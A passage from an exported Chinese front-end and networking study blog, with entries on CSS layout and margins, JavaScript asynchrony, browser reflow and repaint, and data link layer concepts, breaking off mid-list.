<p>当你用表格标记（比如table，tr，th，td元素等）的时候，table本身表现为一个块级元素，然而表格的内容将会根据生成的行和列对齐（line up）。也可以去为其他元素设置display属性使得他们产生像表格布局一样的行为。通过用正确的方式去应用table，table-row和table-cell的值，你可以不需要用table标记就实现一些HTML表格元素的特性。</p>
<p>flexbox和Grid Layout大大扩展了display属性，这些我们在后面文章中讨论。通常来说，这些新的布局模式创造的盒子在外部上下文中表现的就像块级盒子一样，但是在内部对于元素是如何显示的创建了一套新的规则。</p>
<p>这种外部和内部显示模式的分离（比如inline-block，flexbox，grid）正在Display Level 3模块中被标准化。在那里，已存在关于显示模式的特性和关键词正在被扩展以允许更加细粒度的控制。重要的结论是内联级元素和块级元素仍然是html元素默认行为的基本，但事实有略微的差别。</p>
<hr>
<h4 id="匿名盒子（Anonymous-Boxes）"><a href="#匿名盒子（Anonymous-Boxes）" class="headerlink" title="匿名盒子（Anonymous Boxes）"></a>匿名盒子（Anonymous Boxes）</h4><p>如同HTML可以嵌套一样，盒子也能够包含其他的盒子。大多数的盒子是被准确定义的元素形成的。然而有一种情况是块级盒子会被创建即便它没有被明确的定义——当我们在块级元素例如section元素的开始处添加一些文本，如同下面那样，即便没有定义“some text”作为块级元素，它还是被当作块级元素对待的。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">  some text</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Some more text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这种情况下，这个盒子被描述为一个匿名的块级盒子（anonymous block box），因为它没有被关联为一个明确定义的元素。</p>
<p>相似的事情发生在块级元素内部的文本组成的行盒（line boxes）。假定有一个段落包含三行文本，那么每一行文本都形成一个匿名的行盒（anonymous line box），不能够直接对匿名块级盒子或者行盒直接定义样式，除非通过:first-line伪元素，已经被限制使用并且只允许你改变字体和颜色。然而，理解在屏幕上看到的所有元素创建某种形式的盒子是特别有用的。</p>
<hr>
<h4 id="外边距合并（Margin-Collapsing）"><a href="#外边距合并（Margin-Collapsing）" class="headerlink" title="外边距合并（Margin Collapsing）"></a>外边距合并（Margin Collapsing）</h4><p>当谈到常规的块级盒子时，有一种叫做外边距合并的行为。外边距合并是一个相对简单的概念。然而在实践中，当你布局一个web页面的时候，他可能会导致一些困惑。简单来说，当两个或者更多垂直外边距相遇的时候，他们会合并形成一个外边距。这个外边距就等于二者当中比较大的那个外边距的高度。</p>
<p>当两个元素在一起时，第一个元素的底部外边距将会合并第二个元素的顶部外边距。</p>
<p>当一个元素包含在另一个元素内部的时候，假定没有内边距和边框分隔外边距，他们的顶部和底部外边距也会被合并。</p>
<p>起初看来这可能很奇怪，但是外边距居然还会和自身合并。假定有一个空元素，只有外边距没有内边距和边框，在这种情况下，顶部的外边距触摸到底部的外边距，那么就会合并在一起。</p>
<p>如果上面的外边距触摸到其他元素的外边距，将会合并他自己。</p>
<p>这就是为什么许多空的段落元素占据非常小的空间的原因，因为他们的外边距合并成为一个单一的小的外边距了。</p>
<p>外边距合并看上去很奇怪，但事实上是很有道理的。拿一个几个段落的组成的文本页，如果没有外边距合并，第一段和第二段之间的间距就是二倍的第一段的上外边距。正因为有了外边距合并，在每一段之间的边距合并，使得这个间距和其他地方的保持一致。</p>
<p>外边距合并只发生在normal flow中块级盒子的垂直外边距。像inline-box，浮动盒子或者是绝对定位盒子不会发生外边距合并。</p>
<hr>
<h4 id="包含块（Containing-block）"><a href="#包含块（Containing-block）" class="headerlink" title="包含块（Containing block）"></a>包含块（Containing block）</h4><p>给一个元素包含块的概念是十分重要的，因为它决定了像之前看到的百分比padding和margin这些属性是如何解释的。</p>
<p>元素的包含块取决于元素是如何定位的。如果元素是static定位的话（不声明position属性或者显式设置position）或者相对定位，他的包含快被计算到最近的父元素的边缘，这个父元素的display属性会产生一个类块的上下文，包括block，inline-block，table-cell，list-item等等。</p>
<p>默认地，宽高外边距和内边距设定成百分比的时候都是基于父元素的尺寸计算的。当你指定一个元素是绝对定位或者fix定位的时候就会有所改变。下面我们将学习不同的定位模型以及他们是如何和包含块交互的。</p>
<hr>
<h4 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h4><p>当你为一个元素指定相对定位的时候，初始情况下元素仍然在原来所在的位置，只有当设置了上下左右属性值的时候元素才会发生相应的偏移，并且元素仍然占据原本的空间，不脱离文档流，只是相对原来的位置做相对偏移。偏移之后，元素可能会覆盖其他元素。</p>
<hr>
<h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h4><p>相对定位被认为是normal-flow定位模型的一部分，因为元素是相对于它在文档流中的位置进行定位的。相反地，绝对定位使得元素脱离文档流，因此不占据任何空间。其他在文档流中的元素表现地就好像绝对定位元素不在那里一样。</p>
<hr>
<p>2017 年 12月 31日</p>
]]></content>
      <categories>
        <category>Css Mastery</category>
      </categories>
      <tags>
        <tag>css layout</tag>
      </tags>
  </entry>
  <entry>
    <title>异步和单线程</title>
    <url>/2018/01/06/%E5%BC%82%E6%AD%A5%E5%92%8C%E5%8D%95%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<p>我们首先来看一段代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">100</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">200</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">300</span>);</span><br></pre></td></tr></table></figure>
<p>或许你觉得输出的结果应该是按照100，间隔一秒输出200，然后输出300的方式打印。但事实不然，正确的结果是100，300，间隔一秒输出200。</p>
<p>同步和异步的区别在于有没有阻塞程序进行，上面说的后者就没有阻塞程序的进行，这就是所谓的异步。</p>
<p>程序正常执行过程中，由于JS的单线程特性，一次不可以执行多个任务。在遇到异步代码的时候，会将异步代码放到任务队列里面，只有任务队列通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。并且所有同步任务都在主线程上执行，形成一个执行栈，一旦“执行栈”所有同步任务执行完毕，系统才读取“任务队列”</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">100</span>);</span><br><span class="line">alert(<span class="number">200</span>); <span class="comment">// 一秒钟之后点击确认才继续执行</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">300</span>)</span><br></pre></td></tr></table></figure>
<p>这个alert弹框就会阻塞程序，程序是同步进行的。</p>
<a id="more"></a>

<h3 id="同步和异步的区别是什么？分别举例子"><a href="#同步和异步的区别是什么？分别举例子" class="headerlink" title="同步和异步的区别是什么？分别举例子"></a>同步和异步的区别是什么？分别举例子</h3><ul>
<li><p>同步会阻塞代码执行，异步不会</p>
</li>
<li><p>alert是同步的，setTimeout是异步的。</p>
</li>
</ul>
<hr>
<h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>下面看一个例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">3</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">4</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<p>1、3、5、2、4</p>
<hr>
<h3 id="前端使用异步的场景"><a href="#前端使用异步的场景" class="headerlink" title="前端使用异步的场景"></a>前端使用异步的场景</h3><ul>
<li><p>在可能发生等待的情况下</p>
</li>
<li><p>等待过程不能像alert一样阻塞程序进行</p>
</li>
<li><p>因此，所需要等待的情况都需要异步<br>比如</p>
</li>
<li><p>定时任务：setTimeout，setInterval</p>
</li>
<li><p>网络请求：ajax请求，动态<img>加载。</p>
</li>
</ul>
<p>下面是一个ajax的例子，不会因为ajax请求不到数据而发生阻塞，而是继续执行打印end，然后什么时候请求到了数据再执行回调函数。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'start);</span></span><br><span class="line"><span class="string">$.get('</span>./data1.json<span class="string">', function (data1) &#123;</span></span><br><span class="line"><span class="string">  console.log(data1);</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">console.log('</span>end);</span><br></pre></td></tr></table></figure>
<p>下面是一个动态加载图片的例子</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'start'</span>);</span><br><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'loaded);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">img.src = '</span>/xxx.png<span class="string">';</span></span><br><span class="line"><span class="string">console.log('</span>end<span class="string">');</span></span><br></pre></td></tr></table></figure>

<p>img的src可能请求不到或者需要一段时间请求，那么这个时侯onload不能够阻塞程序进行，程序依然需要往下执行。</p>
<ul>
<li>事件绑定</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'start'</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'btn1'</span>).addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="string">'clicked'</span>);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'end'</span>);</span><br></pre></td></tr></table></figure>

<p>有点类似上面的例子，我们并不知道什么时候发生点击事件，所以程序正常向下执行直到点击事件发生再回来执行回调函数。</p>
<hr>
<p>参考资料：<a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2014/10/event-loop.html</a></p>
<p>2018 年 1月 6日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器渲染机制</title>
    <url>/2018/01/11/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h3 id="DOCTYPE及其作用"><a href="#DOCTYPE及其作用" class="headerlink" title="DOCTYPE及其作用"></a>DOCTYPE及其作用</h3><p>DOCTYPE就是声明文档类型和DTD规范的，一个主要用途就是文件合法性验证，如果文件代码不合法，浏览器解析就会出一些差错。</p>
<p>HTML5<!DOCTYPE html></p>
<p>4.0有传统模式（包含所有元素）和严格模式（不包含废弃元素）</p>
<a id="more"></a>

<h3 id="浏览器渲染过程"><a href="#浏览器渲染过程" class="headerlink" title="浏览器渲染过程"></a>浏览器渲染过程</h3><ol>
<li>解析HTML构建DOM树，解析CSS构建CSS的树形结构CSSOM</li>
<li>DOM和CSSOM合并成Render Tree</li>
<li>布局渲染树：浏览器已经知道网页中存在哪些节点以及各个节点的位置，从而计算他们在屏幕中的位置。</li>
<li>绘制渲染树：按照计算出来的规则，通过显卡，将内容绘制在屏幕上。</li>
</ol>
<hr>
<h3 id="重排Reflow（核心点是DOM结构是否发生改变）"><a href="#重排Reflow（核心点是DOM结构是否发生改变）" class="headerlink" title="重排Reflow（核心点是DOM结构是否发生改变）"></a>重排Reflow（核心点是DOM结构是否发生改变）</h3><p>DOM结构中的各个元素都有自己的盒子（模型），这些都要浏览器根据各种样式来计算并根据计算结果将元素放到他们该出现的位置，这个过程叫做reflow。</p>
<p>触发reflow的几种方法</p>
<ul>
<li><p>增加删除或者修改DOM节点，会导致reflow或者repaint</p>
</li>
<li><p>移动DOM位置，或者搞个动画的时候</p>
</li>
<li><p>修改CSS的样式时候</p>
</li>
<li><p>当Resize窗口的时候（移动端没有这个问题），或是滚动的时候</p>
</li>
<li><p>当修改网页默认字体的时候</p>
<p>注意：display:none会触发reflow，触发reflow一定触发repaint，然而visibility：hidden只会触发重绘repaint，显然reflow的成本更高。</p>
</li>
</ul>
<hr>
<h3 id="重绘Repaint"><a href="#重绘Repaint" class="headerlink" title="重绘Repaint"></a>重绘Repaint</h3><p>盒子大小位置颜色、字体大小等确定下来之后，浏览器将这些元素按照各自的特性绘制一遍，页面的内容出现了，这个过程称之为repaint。</p>
<h3 id="优化点"><a href="#优化点" class="headerlink" title="优化点"></a>优化点</h3><ul>
<li><p>不要一条条修改DOM样式，应该预先定义好css的类，然后修改DOM的className</p>
</li>
<li><p>使用documentFragment对象在内存里操作DOM,一次性添加documentFragment</p>
</li>
<li><p>少修改树形结构的下面的分支节点，可能会引起大面积reflow，当然也可能影响较小</p>
</li>
<li><p>为动画的HTML元素设定position为absolute或者fixed，那么修改他们的CSS大大减少reflow</p>
</li>
<li><p>尽量减少使用table布局，很小的改动可能引起table的重新布局。</p>
</li>
</ul>
<hr>
<p>2018 年 1月 11日</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解margin</title>
    <url>/2019/02/28/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3margin/</url>
    <content><![CDATA[<h1 id="深入理解margin"><a href="#深入理解margin" class="headerlink" title="深入理解margin"></a>深入理解margin</h1><h2 id="margin负值的应用"><a href="#margin负值的应用" class="headerlink" title="margin负值的应用"></a>margin负值的应用</h2><p>负margin可以增加元素宽度，典型应用为一列元素，每个元素都有一个margin-right，但是又不想最后那个元素的margin-right显示出来，在父元素和子元素中间增加一层元素来为它设置margin-right为负值，以此来增加父元素宽度，即可实现这种效果。</p>
<a id="more"></a>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'box'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'ul'</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'li'</span>&gt;</span>列表1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'li'</span>&gt;</span>列表2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'li'</span>&gt;</span>列表3<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">960px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">background</span>: orange;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.ul</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">margin-right</span>: -<span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.li</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">background</span>: green;</span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">313.33px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们先确定item的margin-right，然后设置ul的margin-right刚好为这个值的相反数，用box元素的宽度加上这个margin-right，再减去三个margin-right的值，计算出的数值除以3，则得到每个元素的宽度数值。</p>
<h3 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h3><p>margin的百分比基于父元素计算，对于浮动元素的margin-left，如果为-100%，则会到上一行，因为走完了一整个父元素盒子，而后面的元素也会因为这个元素的移动而改变布局。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    padding-left: 220px;//为左右栏腾出空间</span><br><span class="line">    <span class="selector-tag">padding-right</span>: 220<span class="selector-tag">px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">background</span>: red;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">left</span>: -<span class="number">220px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">  <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">  <span class="attribute">background</span>: blue;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">right</span>: -<span class="number">220px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>圣杯布局<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先center，left和right都设置为左浮动，设置center宽度为100%，实现宽度自适应。如此一来，left和right就会掉在center下面，因为center占据了全部的空间。</p>


<p>然后将left的margin-left设置为-100%，right的margin-left设置为自身长度的相反数，就可以将left左移到上一行的起始位置，而right刚好左移到上一行的末尾</p>


<p>设置父容器的padding-left和padding-right，让他们给left和right腾出空间，可以稍微设置的大一点，在此设置为220px。而left和right的宽度为200px，这样我们就能再下面移动left和right到对应的位置后可以和center有20px间距。</p>
<p>下面我们对left和right设置相对定位，注意相对定位是相对于原来所在的位置，将left的left值设置为预留的padding的相反数，而right的right值设置为预留的padding的相反数，保证了二者向正确的方向移动。</p>
<p>圣杯布局有一些缺点：</p>
<ul>
<li>center部分的最小宽度不能小于left部分的宽度，否则会left部分掉到下一行</li>
<li>如果其中一列内容高度拉长(如下图)，其他两列的背景并不会自动填充。(借助等高布局正padding+负margin可解决，下文会介绍)</li>
</ul>
<h3 id="双飞翼布局"><a href="#双飞翼布局" class="headerlink" title="双飞翼布局"></a>双飞翼布局</h3><p>同样也是三栏布局，在圣杯布局基础上进一步优化，解决了圣杯布局错乱问题，实现了内容与布局的分离。而且任何一栏都可以是最高栏，不会出问题。</p>
<p>双飞翼布局前面的思路是一样的，先浮动三个子元素，这时left和right会掉在下面，然后我们利用margin-left的负数特性，将left和right分别推上去到合适的位置。唯一改变的就是对center的处理方式，我们在圣杯布局中是利用的container的左右padding，因为center本来是占据父容器的100%，所以就把center限制在了父容器的content区块中，即减少了content本身的宽度，而给left和right留出来空间。</p>
<p>在双飞翼布局中，我们不利用padding，转而使用margin，这时我们就需要在center中新增一个子元素inner，给inner设置margin，这样我们就将内容限定在了中间，而给left和right留出空间。此时我们不再需要相对定位了。因为不设置container的padding，就不会影响left和right的位置，left和right已经在正确的位置了。我们设置的margin只会影响center的显示区域。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span>双飞翼布局<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    min-width: 600px;//确保中间内容可以显示出来，两倍left宽+right宽</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.left</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">background</span>: red;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">500px</span>;</span><br><span class="line">    <span class="attribute">background</span>: yellow;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.center</span> <span class="selector-class">.inner</span> &#123;</span><br><span class="line">    margin: 0 200px; //新增部分</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.right</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line">    <span class="attribute">background</span>: blue;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">200px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>layout</tag>
        <tag>margin</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络数据链路层</title>
    <url>/2018/05/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
    <content><![CDATA[<h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol>
<li>链路：从一个结点到相邻结点的一段物理线路（有线或无线），而中间没有其他任何的交换结点。</li>
<li>数据链路： 在一条线路上传送数据时，除了要有物理线路，还要有一些必要的通信协议来控制这些数据的传输，若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。最常用的办法是使用网络适配器实现这些协议。</li>
<li>帧：点对点信道的数据链路层的协议数据单元，就是对网络层下发的IP数据报的添加首部和尾部封装成帧。<a id="more"></a></li>
<li>MTU（Maximum Transfer Unit，最大传送单元）：将IP数据报封装成帧，利用帧首部和尾部进行帧定界。为了提高传输效率，应当使得数据部分长度尽量大于首部和尾部的长度和，但是每种数据链路层协议都规定了所传送帧的数据部分长度上限，即最大传送单元。</li>
<li>误码率BER(Bit Error Rate）：现实的通信链路都不会太理想，传输过程中可能存在比特差错，比如0变成1，1变成0。误码率指的是在一段时间内，传输错误的比特占传输比特总数的比率。</li>
<li>PPP（Point to Point Protocol）：对于点对点链路，简单的点对点协议PPP是目前使用最广泛的数据链路层协议。</li>
<li>CSMA/CD（Carrier Sense Multiple Access/Collision Detect）：带碰撞检测的载波监听多路访问协议。</li>
<li>FCS：帧检验序列，用于检测帧在传输过程中是否出错，可用CRC算法生成。</li>
<li>曼彻斯特编码：以太网发送的数据采用曼彻斯特编码，在每个码元中间会出现一次电压转换，接收端可以利用这种电压的转换将位同步信号提取出来。通过曼彻斯特编码，在以太网帧中不需要指定帧长度，因为当不出现电压跳变时，向前查4个字节的FCS就可以找到数据字段的结束位置。</li>
<li>争用期：在使用CSMA/CD协议的广播信道中，要实现碰撞检测，当端到端传播时延为τ时，那至多2τ时间就可以检测到是否发生碰撞，当经过这么长时间还未检测到碰撞就可以肯定这次发送不会产生碰撞。</li>
<li>集线器Hub：工作在物理层，用于组以太网。集线器组的以太网逻辑上依然是总线型网络，还是用CSMA/CD协议。</li>
<li>MAC（Media Access Control）媒体接入控制：局域网中，硬件地址又称为物理地址或MAC地址。</li>
<li>网桥：工作在数据链路层，根据MAC帧的目的地址转发收到的帧，适用于用户数不多的通信量不太大的网络，否则发送的广播包太多，就会产生广播风暴。</li>
<li>交换机：足够多接口的网桥就成为了今天的交换机，各个接口直接接计算机，具有存储转发功能，使抓包工具无效，更安全，更高效（无冲突，排队等待），可设置全双工工作方式。</li>
<li>单播：收到的帧的MAC地址与本站的MAC地址相同。</li>
<li>组播：发送给本局域网一部分站点的帧。</li>
<li>广播：发送给本局域网所有站点的帧（全1地址）。</li>
<li>VLAN（Virtual Local Area Network）虚拟局域网：是一些局域网网段构成的与物理位置无关的逻辑组，交换机的出现使得VLAN成为可能，每个VLAN帧都有一个标识来表明是来自哪个VLAN的帧。</li>
<li>CSMA/CA：带冲突避免的载波监听多路访问协议，用于无线局域网的数据传输。</li>
<li>接入点AP：基本服务集BSS中的基站。</li>
<li>分配系统DS：使扩展服务集ESS对上层的表现就像一个基本服务集BSS一样。</li>
<li>服务集标识符SSID：无线局域网的名字。</li>
<li>基本服务集BSS与扩展服务集ESS：构成无线局域网的最小构件是BSS，ESS是多个多个BSS通过分布系统互联起来的。</li>
<li>热点：向公众提供有偿或无偿接入WIFI的地方。</li>
<li>移动自组网络：无固定基础设施的无线局域网。</li>
<li>802.11：无线局域网的协议标准。</li>
</ol>
<h2 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h2><h3 id="数据链路层的三个基本任务是什么？如何实现？？"><a href="#数据链路层的三个基本任务是什么？如何实现？？" class="headerlink" title="数据链路层的三个基本任务是什么？如何实现？？"></a>数据链路层的三个基本任务是什么？如何实现？？</h3><ul>
<li>封装成帧：在一段数据的前后分别添加首部和尾部，那么接收端在收到物理层上交的比特流后，就可以根据首部和尾部的标记，从收到的比特流中识别帧的开始和结束。</li>
<li>透明传输：透明传输指的是无论什么样的比特组合的数据，都能按照原样无差错的通过这个数据链路层，数据链路层对于这些数据来说是透明的。通过在数据中出现控制字符的前面添加转义字符，以及当在数据中出现转义字符前面也添加转义字符实现的。</li>
<li>差错检测：使用CRC循环冗余检验实现。</li>
</ul>
<h3 id="数据链路层使用的信道分类"><a href="#数据链路层使用的信道分类" class="headerlink" title="数据链路层使用的信道分类"></a>数据链路层使用的信道分类</h3><ul>
<li>点对点信道</li>
<li>广播信道</li>
</ul>
<h3 id="CRC循环冗余检验的工作原理"><a href="#CRC循环冗余检验的工作原理" class="headerlink" title="CRC循环冗余检验的工作原理"></a>CRC循环冗余检验的工作原理</h3><p>在要传送的二进制数据M末尾添加n位0，相当于M乘以2的n次方。然后设置除数为n+1位的双方事先约定好的二进制数，做模二运算，然后得到n位的余数添加到原数据M末尾。将帧传送出去。接收方收到数据，将其除以约定好的n+1位数字做模二运算，如果余数为0，则认为传输过程中无差错，否则出现差错予以丢弃。</p>
<h3 id="什么是PPP协议？用于何种信道的链路层控制？PPP的工作原理。"><a href="#什么是PPP协议？用于何种信道的链路层控制？PPP的工作原理。" class="headerlink" title="什么是PPP协议？用于何种信道的链路层控制？PPP的工作原理。"></a>什么是PPP协议？用于何种信道的链路层控制？PPP的工作原理。</h3><ul>
